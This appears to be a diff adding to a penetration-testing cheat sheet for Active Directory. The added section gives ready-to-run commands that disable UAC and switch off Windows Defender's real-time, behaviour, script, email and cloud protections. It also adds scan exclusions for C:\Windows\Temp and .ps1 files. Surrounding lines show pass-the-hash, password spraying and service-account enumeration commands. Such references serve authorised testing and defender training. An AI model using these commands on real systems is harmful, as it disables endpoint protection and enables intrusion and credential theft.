@@ -427,11 +427,67 @@ sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de
 # Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.
 Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 ```
-## Enumerating Security Controls AntiVirus
+#### [Enumerating Disabling/Bypassing AV](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender)
 ```
-# PowerShell cmd-let used to check the status of Windows Defender Anti-Virus from a Windows-based host.
+# Check if Defender is enabled
 Get-MpComputerStatus
+Get-MpComputerStatus | Select AntivirusEnabled
+
+# Check if defensive modules are enabled
+Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
+
+# Check if tamper protection is enabled
+Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL
+
+# Check for alternative Av products
+Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+
+# Disabling UAC
+cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
+
+# Disables realtime monitoring
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Disables scanning for downloaded files or attachments
+Set-MpPreference -DisableIOAVProtection $true
+
+# Disable behaviour monitoring
+Set-MPPreference -DisableBehaviourMonitoring $true
+
+# Make exclusion for a certain folder
+Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+
+# Disables cloud detection
+Set-MPPreference -DisableBlockAtFirstSeen $true
+
+# Disables scanning of .pst and other email formats
+Set-MPPreference -DisableEmailScanning $true
+
+# Disables script scanning during malware scans
+Set-MPPReference -DisableScriptScanning $true
+
+# Exclude files by extension
+Set-MpPreference -ExclusionExtension "ps1"
+
+# Turn off everything and set exclusion to "C:\Windows\Temp"
+Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+
+# Bypassing with path exclusion
+Add-MpPreference -ExclusionPath "C:\Windows\Temp"
 
 # PowerShell cmd-let used to view AppLocker policies from a Windows-based host.
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
+#### [Living Of The Land](https://lolbas-project.github.io/#)
+Get-Module - PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host
+
+
+Import-Module ActiveDirectory - Loads the Active Directory PowerShell module from a Windows-based host.
+
+
+Get-ADDomain - PowerShell cmd-let used to gather Windows domain information from a Windows-based host.
+
+
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName - PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by ServicePrincipalName. Performed from a Windows-based host.
+
+
